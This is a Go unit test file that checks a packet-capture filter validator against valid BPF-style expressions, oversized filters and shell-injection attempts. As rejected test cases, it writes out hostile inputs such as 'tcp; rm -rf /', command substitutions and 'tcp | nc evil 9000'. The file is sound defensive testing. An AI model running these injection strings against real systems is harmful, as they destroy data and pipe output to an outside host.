package capture

import (
	"errors"
	"strings"
	"testing"
)

func TestValidateFilter(t *testing.T) {
	cases := []struct {
		name    string
		filter  string
		wantErr bool
	}{
		{"empty is allowed (capture all on scoped iface)", "", false},
		{"simple protocol", "tcp", false},
		{"protocol and port", "tcp port 443", false},
		{"host and udp", "host 10.0.0.5 and udp", false},
		{"vlan", "vlan 100", false},
		{"cidr net", "net 10.0.0.0/24", false},
		{"parenthesized or", "tcp and (port 80 or port 443)", false},
		{"src/dst qualifiers", "src host 10.0.0.1 and dst port 22", false},
		{"byte access", "ip[0] = 0x45", false},
		{"negation", "not arp", false},

		{"shell semicolon", "tcp; rm -rf /", true},
		{"backtick", "tcp `whoami`", true},
		{"dollar", "tcp $(id)", true},
		{"pipe to shell", "tcp | nc evil 9000", true},
		{"ampersand background", "tcp & sleep 100", true},
		{"unknown bare token", "tcp and rm", true},
		{"quote", "host \"evil\"", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateFilter(tc.filter, DefaultMaxFilterInstructions)
			if tc.wantErr && err == nil {
				t.Errorf("ValidateFilter(%q) = nil, want error", tc.filter)
			}
			if !tc.wantErr && err != nil {
				t.Errorf("ValidateFilter(%q) = %v, want nil", tc.filter, err)
			}
			if tc.wantErr && err != nil && !errors.Is(err, ErrInvalidFilter) {
				t.Errorf("ValidateFilter(%q) error = %v, want ErrInvalidFilter", tc.filter, err)
			}
		})
	}
}

func TestValidateFilterInstructionCeiling(t *testing.T) {
	oversized := "host 1.1.1.1" + strings.Repeat(" or host 1.1.1.1", 80)
	if err := ValidateFilter(oversized, DefaultMaxFilterInstructions); !errors.Is(err, ErrInvalidFilter) {
		t.Errorf("oversized filter err = %v, want ErrInvalidFilter", err)
	}
	// A tight ceiling rejects even a small filter.
	if err := ValidateFilter("tcp and udp and arp", 2); !errors.Is(err, ErrInvalidFilter) {
		t.Errorf("filter over a tight ceiling err = %v, want ErrInvalidFilter", err)
	}
}

func TestValidateFilterLengthCeiling(t *testing.T) {
	huge := "tcp" + strings.Repeat("x", maxFilterLen)
	if err := ValidateFilter(huge, DefaultMaxFilterInstructions); !errors.Is(err, ErrInvalidFilter) {
		t.Errorf("over-length filter err = %v, want ErrInvalidFilter", err)
	}
}
